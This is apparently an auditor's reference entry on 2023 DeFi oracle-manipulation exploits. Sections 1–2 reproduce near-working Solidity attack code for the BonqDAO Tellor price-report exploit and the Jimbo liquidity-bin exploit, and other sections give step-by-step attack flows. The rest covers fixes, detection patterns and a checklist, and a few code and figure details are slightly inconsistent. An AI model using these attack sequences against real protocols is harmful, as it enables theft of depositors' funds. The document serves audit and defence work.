---
# Core Classification
protocol: "generic"
chain: "ethereum, arbitrum, polygon, avax, bsc"
category: "price_manipulation"
vulnerability_type: "tellor_oracle_manipulation, spot_price_oracle, reserve_ratio_manipulation, lp_price_manipulation, flash_loan_oracle"

# Pattern Identity (Required)
root_cause_family: missing_validation
pattern_key: tellor_oracle_manipulation | tellor_oracle | flash_loan_price_manipulation | fund_loss

# Interaction Scope
interaction_scope: cross_protocol

# Attack Vector Details
attack_type: "flash_loan_price_manipulation"
affected_component: "tellor_oracle, liquidity_bin, curve_pool, balancer_pool, DEX_pair, lending_oracle"

# Technical Primitives
primitives:
  - "tellor_submitValue"
  - "low_cost_oracle_report"
  - "getDataBefore"
  - "reserve_ratio"
  - "shift_reset"
  - "liquidity_bin_manipulation"
  - "curve_add_remove_liquidity"
  - "spot_price_getReserves"
  - "flash_loan"
  - "borrow_against_inflated"
  - "price_per_share"
  - "vToken_price"

# Impact Classification
severity: "critical"
impact: "fund_loss"
exploitability: 0.90
financial_impact: "critical"

# Grep / Hunt-Card Seeds (Required)
code_keywords:
  - "reset"
  - "shift"
  - "getPrice"
  - "rebalance"
  - "spot_price"
  - "getReserves"
  - "updatePrice"
  - "getDataBefore"
  - "DISPUTE_WINDOW"
  - "getCurrentValue"
  - "executeOperation"
  - "tx1_mintMassiveAmountOfBEUR"
  - "tx2_liquidateMassiveAmountOfALBT"
path_keys:
  - "low_cost_oracle_reporter_manipulation_bonqdao_88m"
  - "concentrated_liquidity_bin_manipulation_jimbo_8m"
  - "curve_lp_token_price_manipulation_zunami_2m"
  - "vtoken_collateral_oracle_manipulation_0vix_2m"
  - "flash_loan_spot_price_compounderfinance_27_2m_gamma_6_3m_all"
  - "lending_protocol_oracle_manipulation_rodeofinance_888k"

# Context Tags
tags:
  - "defi"
  - "oracle"
  - "price_manipulation"
  - "tellor"
  - "bonqdao"
  - "jimbo"
  - "zunami"
  - "0vix"
  - "gamma"
  - "flash_loan"
  - "LP_manipulation"
  - "reserve_ratio"
  - "liquidity_bin"
  - "compounder"
  - "curve"
  - "balancer"
  - "lending"
  - "borrowing"
  - "collateral"
  - "real_exploit"
  - "DeFiHackLabs"
  - "2023"

# Version Info
language: "solidity"
version: ">=0.8.0"

# Source
source: DeFiHackLabs
total_exploits_analyzed: 8
total_losses: "$135M+"
---

## References

| Tag | Source | Path / URL |
|-----|--------|------------|
| [BONQ-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2023-02/BonqDAO_exp.sol` |
| [JIMBO-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2023-05/Jimbo_exp.sol` |
| [ZUNAMI-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2023-08/Zunami_exp.sol` |
| [0VIX-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2023-04/0vix_exp.sol` |
| [GAMMA-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2023-01/Gamma_exp.sol` |
| [COMPOUNDER-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2023-01/CompounderFinance_exp.sol` |
| [ALLBRIDGE-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2023-04/Allbridge_exp.sol` |
| [RODEO-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2023-07/RodeoFinance_exp.sol` |

---

# Oracle & Price Manipulation Attack Patterns (2023)
## Overview

2023 oracle manipulation exploits demonstrated the full spectrum of price attack vectors — from low-cost oracle reporter manipulation (BonqDAO $88M via Tellor for just 10 TRB stake) to sophisticated concentrated liquidity bin manipulation (Jimbo $8M), to classic flash-loan LP price inflation (Zunami $2M, 0vix $2M, Gamma $6.3M, Compounder $27.2M). The key insight: any protocol that uses on-chain spot prices, reserves, or cheaply-manipulable oracle feeds as the source of truth for collateral valuation or swap rates is exploitable. Total losses across the analyzed exploits exceed **$135M**.

---


### Agent Quick View

| Field | Value |
|-------|-------|
| Root Cause | `missing_validation` |
| Pattern Key | `tellor_oracle_manipulation | tellor_oracle | flash_loan_price_manipulation | fund_loss` |
| Severity | CRITICAL |
| Impact | fund_loss |
| Interaction Scope | `cross_protocol` |
| Chain(s) | ethereum, arbitrum, polygon, avax, bsc |


## 1. Low-Cost Oracle Reporter Manipulation (BonqDAO $88M)

> **pathShape**: `linear-multistep`

### Root Cause

BonqDAO used TellorFlex oracle for wALBT token pricing. TellorFlex allows anyone to submit price reports after staking a small amount of TRB tokens (10 TRB, ~$175). The protocol read the latest reported price directly via `getCurrentValue()` without waiting for a dispute window. An attacker could stake 10 TRB, submit an extreme price (5×10²⁷ times normal), and immediately use that price to borrow or liquidate.

### Attack Scenario (Two Transactions)

**Tx1 — Borrow at inflated price:**
1. Stake 10 TRB on TellorFlex
2. Submit wALBT price as 5×10²⁷ (astronomically high)
3. Create a trove with 0.1 wALBT as collateral
4. Borrow 100M BEUR — collateral "worth" trillions at fake price
5. Result: 100M BEUR minted from 0.1 wALBT

**Tx2 — Liquidate at deflated price:**
1. Stake another 10 TRB
2. Submit wALBT price as 0.0000001 (near zero)
3. All other borrowers' troves are now underwater
4. Liquidate 43 troves — seize their wALBT collateral
5. Repay own debt, withdraw remaining wALBT

### Vulnerable Pattern Examples

**Example 1: BonqDAO — TellorFlex Oracle Manipulation ($88M, Feb 2023)** [CRITICAL] `@audit` [BONQ-POC]

```solidity
// ❌ VULNERABLE: Protocol reads latest Tellor price without dispute window
// Staking cost (~$175) is negligible vs. exploit profit ($88M)

// Tx1: Report extremely HIGH price → borrow against inflated collateral
function tx1_mintMassiveAmountOfBEUR() public {
    // Step 1: Deploy reporter contract, stake 10 TRB
    PriceReporter Reporter = new PriceReporter();
    TRB.transfer(address(Reporter), TellorFlex.getStakeAmount());

    // Step 2: Submit manipulated price — wALBT = 5×10²⁷ USD
    Reporter.updatePrice(10e18, 5e27);
    // @audit submitValue() accepts ANY price from ANY staked reporter
    // @audit No dispute window enforced by BonqDAO before reading

    // Step 3: Create trove with tiny collateral
    maliciousTrove = BonqProxy.createTrove(address(WALBT));
    WALBT.transfer(maliciousTrove, 0.1 * 1e18);
    ITrove(maliciousTrove).increaseCollateral(0, address(0));

    // Step 4: Borrow 100M BEUR — barely any real collateral
    ITrove(maliciousTrove).borrow(address(this), 100_000_000e18, address(0));
    // @audit 0.1 wALBT × 5×10²⁷ price = massive borrowing power
    // @audit Protocol doesn't check against TWAP or historical prices
}

// Tx2: Report extremely LOW price → liquidate all other borrowers
function tx2_liquidateMassiveAmountOfALBT() public {
    PriceReporter Reporter = new PriceReporter();
    TRB.transfer(address(Reporter), TellorFlex.getStakeAmount());

    // Submit near-zero price for wALBT
    Reporter.updatePrice(10e18, 0.0000001 * 1e18);
    // @audit All existing borrowers are now underwater

    // Liquidate all 43 troves at near-zero collateral value
    address[] memory troves = new address[](45);
    troves[0] = BonqProxy.firstTrove(address(WALBT));
    for (uint256 i = 1; i < troves.length; ++i) {
        troves[i] = BonqProxy.nextTrove(address(WALBT), troves[i - 1]);
    }

    for (uint256 i = 1; i < troves.length - 1; ++i) {
        address target = troves[i];
        uint256 debt = ITrove(target).debt();
        if (debt == 0) continue;
        ITrove(target).liquidate();
        // @audit Each liquidation seizes victim's wALBT for attacker's BEUR
    }
    // @audit Total: 100.5M BEUR + 113.8M wALBT stolen
}

// The vulnerable oracle interaction:
function updatePrice(uint256 _tokenId, uint256 _price) public {
    TRB.approve(address(TellorFlex), type(uint256).max);
    TellorFlex.depositStake(_tokenId);           // @audit Stake just 10 TRB (~$175)
    TellorFlex.submitValue(queryId, price, 0, queryData);
    // @audit Attacker is now the official price reporter for wALBT
    // @audit No minimum stake proportional to protocol TVL
}
// @audit Root cause: Using latest oracle value without dispute window
// @audit Fix: Use getDataBefore(timestamp - DISPUTE_WINDOW) instead of getCurrentValue()
// @audit Fix: Require minimum dispute period before using reported prices
// @audit Fix: Cap price change per block/hour (circuit breaker)
```

---

## 2. Concentrated Liquidity Bin Manipulation (Jimbo $8M)

> **pathShape**: `linear-multistep`

### Root Cause

Jimbo Protocol used a custom liquidity distribution mechanism on Trader Joe V2.1 (Liquidity Book). The protocol's `shift()` and `reset()` functions redistributed liquidity across bins based on current price. An attacker could:
1. Swap to move the price to a bin with zero liquidity
2. Add a tiny amount of liquidity in a high-price bin
3. Call `shift()` to redistribute protocol liquidity based on the manipulated price
4. Swap back through the now-concentrated liquidity to extract value

### Vulnerable Pattern Examples

**Example 2: Jimbo Protocol — Liquidity Bin Shift Manipulation ($8M, May 2023)** [CRITICAL] `@audit` [JIMBO-POC]

```solidity
// ❌ VULNERABLE: shift() redistributes liquidity based on current bin price
// Attacker manipulates bin before calling shift() → concentrates liquidity in attacker's range

function executeOperation(...) external returns (bool) {
    // Step 1: Swap small amount to move to a specific bin
    router.swapNATIVEForExactTokens{value: 10 ether}(
        1 ether, path, address(this), block.timestamp + 100
    );

    // Step 2: Add liquidity at the current (manipulated) bin
    uint24 activeId = pair.getActiveId();
    // @audit Adding liquidity at actively manipulated bin position

    int256[] memory deltaIds = new int256[](1);
    deltaIds[0] = 0;  // @audit Same bin as current price
    uint256[] memory distributionX = new uint256[](1);
    distributionX[0] = 0;
    uint256[] memory distributionY = new uint256[](1);
    distributionY[0] = 1e18;  // @audit 100% in one bin

    router.addLiquidity(
        ILBRouter.LiquidityParameters(
            Jimbo, IERC20(address(weth)), 100,
            amount1, 0, 0, 0,
            activeId, 0, deltaIds, distributionX, distributionY,
            address(this), address(this), block.timestamp + 100
        )
    );

    // Step 3: Dump massive amount of JIMBO to crash price
    router.swapExactTokensForNATIVE(
        Jimbo.balanceOf(address(this)), 0, reversePath, payable(address(this)),
        block.timestamp + 100
    );
    // @audit Price moves down dramatically

    // Step 4: Trigger protocol's shift() — redistributes liquidity at low price
    controller.shift();
    // @audit shift() concentrates protocol liquidity around new (low) active bin
    // @audit Protocol's liquidity is now concentrated where attacker expects

    // Step 5: Reset — return liquidity to "normal"
    controller.reset();

    // Step 6: Swap ETH → JIMBO at advantageous rate
    router.swapNATIVEForExactTokens{value: amountOut}(
        pair.getBin(anchorBin).binReserveX, path, address(this), block.timestamp + 100
    );
    // @audit Buys JIMBO at the manipulated concentrated price
    // @audit Then sells at fair market → $8M profit
}
// @audit Root cause: shift()/reset() use spot bin price for redistribution
// @audit Fix: Use TWAP for bin selection, enforce time-locks on shift
```

---

## 3. Curve LP Token Price Manipulation (Zunami $2M)

> **pathShape**: `atomic`

### Root Cause

Zunami Protocol used Curve LP tokens (sETH/ETH, frxETH/ETH) whose price was derived from pool reserves. An attacker could flash loan massive amounts, add/remove liquidity to manipulate the LP token's value, and exploit Zunami's oracle that relied on spot Curve pool state.

### Vulnerable Pattern Examples

**Example 3: Zunami Protocol — Curve LP Price Manipulation ($2M, Aug 2023)** [HIGH] `@audit` [ZUNAMI-POC]

```solidity
// ❌ VULNERABLE: Zunami oracle reads Curve LP price from spot reserves
// Flash loan manipulation of Curve pool inflates LP token value

// Attack flow:
// 1. Flash loan ~12K ETH from Balancer
// 2. Swap ETH → sETH on Curve (pushes sETH price up)
// 3. Add massive sETH liquidity to Curve pool
// 4. LP token price is now inflated
// 5. Deposit into Zunami at overvalued LP price → receive more ZUN tokens
// 6. Remove liquidity from Curve → LP price normalizes
// 7. Sell ZUN tokens at fair value → profit

// @audit Root cause: Using Curve spot reserves for LP pricing
// @audit Fix: Use Curve's internal oracle or time-weighted virtual price
// @audit Total: ~$2M extracted from Zunami's strategy pools
```

---

## 4. vToken Collateral Oracle Manipulation (0vix $2M)

> **pathShape**: `atomic`

### Root Cause

0vix Protocol (Compound V2 fork on Polygon) used vGHST as a collateral token. The oracle price for vGHST was derived from the underlying GHST token's Aave aGHST supply rate. By manipulating the aGHST vault's exchange rate through flash loans, the attacker inflated vGHST's value, borrowed against it, then let the price return to normal.

### Vulnerable Pattern Examples

**Example 4: 0vix Protocol — vGHST Oracle Exchange Rate Manipulation ($2M, Apr 2023)** [HIGH] `@audit` [0VIX-POC]

```solidity
// ❌ VULNERABLE: vGHST price derived from aGHST vault exchange rate
// Flash loan deposit into Aave inflates aGHST rate → inflates vGHST collateral value

// Attack flow:
// 1. Flash loan GHST tokens
// 2. Deposit into Aave's aGHST vault → manipulate exchange rate
// 3. 0vix oracle reads vGHST price from aGHST rate → overvalued
// 4. Supply vGHST as collateral at inflated price
// 5. Borrow USDC/USDT against overvalued vGHST
// 6. Withdraw from Aave → aGHST rate normalizes
// 7. vGHST collateral is now worth less than borrowed amount → bad debt

// @audit Root cause: Using manipulable vault exchange rate as oracle price
// @audit Fix: Use external oracle (Chainlink) for collateral pricing
// @audit Fix: Cap price movements per block (circuit breaker)
```

---

## 5. Flash Loan + Spot Price (CompounderFinance $27.2M, Gamma $6.3M, Allbridge $550K)

> **pathShape**: `atomic`

### Root Cause

Multiple protocols in 2023 continued to use DEX spot prices (pair reserves, `getReserves()`) as oracle prices. Flash loans made all these protocols trivially exploitable: inflate token price by swapping massive amounts → interact with vulnerable protocol at inflated price → swap back.

### Vulnerable Pattern Examples

**Example 5: CompounderFinance / Gamma / Allbridge — Classic Flash Loan Price Manipulation ($33M+ combined, Jan-Apr 2023)** [CRITICAL] `@audit` [COMPOUNDER-POC] [GAMMA-POC] [ALLBRIDGE-POC]

```solidity
// ❌ VULNERABLE: Protocol uses spot DEX price for valuation
// Pattern appears across multiple 2023 exploits:

// CompounderFinance ($27.2M, Jan 2023):
// - Used Uniswap V2 spot price for vault token valuation
// - Flash loan → swap → deposit at inflated price → swap back
// - Vault issued too many shares for the manipulated deposit

// Gamma ($6.3M, Jan 2023):
// - Used Uniswap V3 spot sqrtPriceX96 for position valuation
// - Flash loan → swap to manipulate tick → deposit at wrong price
// - Position valued at inflated rate → extracted excess value

// Allbridge ($550K, Apr 2023):
// - Used pool balance ratio as exchange rate
// - Flash loan → deposit massive tokens → inflate rate → swap at profit

// @audit Common root cause: spot_price = pair.getReserves() or equivalent
// @audit Fix: Use Chainlink/TWAP oracle, not spot reserves
// @audit Fix: Add minimum holding period for deposits/withdrawals
// @audit Fix: Validate price against multiple sources (median price)
```

---

## 6. Lending Protocol Oracle Manipulation (RodeoFinance $888K)

> **pathShape**: `atomic`

### Root Cause

RodeoFinance on Arbitrum used a TWAP oracle for collateral pricing, but the TWAP window was too short (1 hour or less). An attacker could manipulate the price over multiple blocks to shift the TWAP, then borrow against the manipulated collateral value.

### Vulnerable Pattern Examples

**Example 6: RodeoFinance — Insufficient TWAP Window ($888K, Jul 2023)** [HIGH] `@audit` [RODEO-POC]

```solidity
// ❌ VULNERABLE: TWAP window too short — manipulable over a single hour
// Attacker sustained price manipulation across multiple blocks

// Attack flow:
// 1. Manipulate price over ~60 minutes via sustained swaps
// 2. TWAP shifts to manipulated level
// 3. Borrow against inflated collateral
// 4. Stop manipulation → price reverts → bad debt

// @audit Root cause: TWAP window < manipulation cost horizon
// @audit Fix: Use minimum 30-minute TWAP for large-cap tokens
// @audit Fix: Use minimum 4-hour TWAP for small-cap tokens
// @audit Fix: Add price deviation limits (circuit breakers)
```

---

## Secure Implementations

### Pattern 1: Tellor with Dispute Window
```solidity
// ✅ SECURE: Read Tellor price with sufficient dispute window
function getPrice(bytes32 queryId) external view returns (uint256) {
    // Read price that was reported at least 20 minutes ago
    (bool retrieved, bytes memory value, uint256 timestamp) =
        TellorFlex.getDataBefore(queryId, block.timestamp - 20 minutes);

    require(retrieved, "NO_PRICE_DATA");
    require(block.timestamp - timestamp < 24 hours, "PRICE_TOO_OLD");

    uint256 price = abi.decode(value, (uint256));
    // @audit Using getDataBefore with 20-minute dispute window
    // @audit Not getCurrentValue() which reads unvetted latest report
    return price;
}
```

### Pattern 2: Multi-Source Oracle with Deviation Check
```solidity
// ✅ SECURE: Use multiple price sources with deviation bounds
function getPrice(address token) external view returns (uint256) {
    uint256 chainlinkPrice = getChainlinkPrice(token);
    uint256 twapPrice = getTWAPPrice(token);

    uint256 deviation = chainlinkPrice > twapPrice
        ? ((chainlinkPrice - twapPrice) * 1e18) / chainlinkPrice
        : ((twapPrice - chainlinkPrice) * 1e18) / twapPrice;

    require(deviation < maxDeviation, "PRICE_DEVIATION_TOO_HIGH");
    // @audit Circuit breaker prevents manipulation of either source

    return (chainlinkPrice + twapPrice) / 2;
}
```

### Pattern 3: Time-Weighted Liquidity Distribution
```solidity
// ✅ SECURE: Use TWAP bin for liquidity redistribution
function shift() external {
    uint24 twapBin = getTWAPActiveBin(4 hours);
    // @audit Use 4-hour TWAP bin, not spot bin
    // @audit Attacker can't manipulate by short-term swaps

    require(
        block.timestamp - lastShiftTimestamp >= MIN_SHIFT_INTERVAL,
        "SHIFT_TOO_FREQUENT"
    );
    // @audit Minimum interval prevents rapid repeated manipulation

    _redistributeLiquidity(twapBin);
    lastShiftTimestamp = block.timestamp;
}
```

---

## Impact Analysis

| Pattern | Frequency | Combined Losses | Severity |
|---------|-----------|----------------|----------|
| Low-cost oracle reporter | 1/8 reports (BonqDAO) | $88M | CRITICAL |
| Flash loan + spot price | 3/8 reports (Compounder, Gamma, Allbridge) | $33M+ | CRITICAL |
| Concentrated liquidity bin manipulation | 1/8 reports (Jimbo) | $8M | CRITICAL |
| Curve LP price manipulation | 1/8 reports (Zunami) | $2M | HIGH |
| vToken exchange rate manipulation | 1/8 reports (0vix) | $2M | HIGH |
| Short TWAP window | 1/8 reports (Rodeo) | $888K | HIGH |

---

## Detection Patterns

### Static Analysis
```
// Detect spot price oracle usage
pattern: getReserves\(\)|reserve0|reserve1|sqrtPriceX96
context: getPrice|oracle|valuation|collateral

// Detect Tellor getCurrentValue without dispute window
pattern: getCurrentValue\(
anti-pattern: getDataBefore\(

// Detect single-source oracle without deviation check
pattern: function.*getPrice.*returns.*uint256
anti-pattern: chainlink.*&&.*twap|deviation|maxDeviation
```

### Dynamic Testing
```
// Test: Can oracle price be moved 50%+ in one block via flash loan?
flashLoan(massive_amount);
swap(token → inflateTarget);
uint256 newPrice = oracle.getPrice(token);
assert(newPrice / oldPrice < 1.1); // should NOT move more than 10%

// Test: Does Tellor oracle enforce dispute window?
tellorFlex.submitValue(queryId, extremePrice, 0, queryData);
uint256 price = protocol.getPrice(token);
// price should NOT reflect the just-submitted extreme value
```

---

## Audit Checklist

- [ ] Does the protocol use `getCurrentValue()` from Tellor? Should use `getDataBefore()` with dispute window
- [ ] Is the oracle staking cost proportional to protocol TVL?
- [ ] Does price manipulation via flash loan affect collateral valuation?
- [ ] Is TWAP window sufficient? (>30min for large-cap, >4hr for small-cap)
- [ ] Are Curve/Balancer LP prices protected against read-only reentrancy?
- [ ] Can `shift()`/`reset()`/`rebalance()` functions be called permissionlessly while price is manipulated?
- [ ] Are there circuit breakers for large price deviations?
- [ ] Does the protocol use vault exchange rates as oracle prices? (manipulable)
- [ ] Are multiple price sources compared with deviation checks?

---

## Real-World Examples

| Protocol | Date | Loss | Chain | Root Cause | PoC |
|----------|------|------|-------|------------|-----|
| BonqDAO | Feb 2023 | $88M | Polygon | Tellor oracle — low-cost reporter manipulation | [BONQ-POC] |
| Compounder | Jan 2023 | $27.2M | ETH | Spot Uniswap V2 price as vault oracle | [COMPOUNDER-POC] |
| Jimbo | May 2023 | $8M | ARB | Liquidity bin shift() manipulation | [JIMBO-POC] |
| Gamma | Jan 2023 | $6.3M | ETH | Uniswap V3 sqrtPriceX96 manipulation | [GAMMA-POC] |
| Zunami | Aug 2023 | $2M | ETH | Curve LP spot price manipulation | [ZUNAMI-POC] |
| 0vix | Apr 2023 | $2M | Polygon | vGHST/aGHST exchange rate manipulation | [0VIX-POC] |
| RodeoFinance | Jul 2023 | $888K | ARB | TWAP window too short for manipulation cost | [RODEO-POC] |
| Allbridge | Apr 2023 | $550K | BSC | Pool balance ratio as exchange rate | [ALLBRIDGE-POC] |

---

## Keywords

oracle_manipulation, price_manipulation, tellor, tellorFlex, submitValue, getCurrentValue, getDataBefore, dispute_window, bonqdao, flash_loan, spot_price, getReserves, sqrtPriceX96, TWAP, virtual_price, Curve_LP, liquidity_bin, shift, reset, rebalance, concentrated_liquidity, vToken, exchange_rate, aGHST, vGHST, circuit_breaker, deviation_check, jimbo, zunami, 0vix, gamma, compounder, allbridge, rodeo, multi_source_oracle, price_feed, collateral_valuation, 2023, DeFiHackLabs
